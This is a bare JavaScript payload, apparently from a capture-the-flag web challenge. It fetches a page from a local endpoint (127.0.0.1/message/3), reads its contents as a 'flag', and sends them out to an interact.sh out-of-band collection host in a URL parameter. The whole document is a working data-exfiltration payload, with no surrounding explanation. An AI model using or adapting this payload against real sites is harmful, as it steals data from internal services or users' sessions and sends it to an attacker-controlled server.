fetch("http://127.0.0.1/message/3").then(response => {
	return response.text()
}).then(flag => {
	fetch("http://c9zv8s32vtc0000byq1ggr97wcoyyyyyb.interact.sh/?test="+flag)
})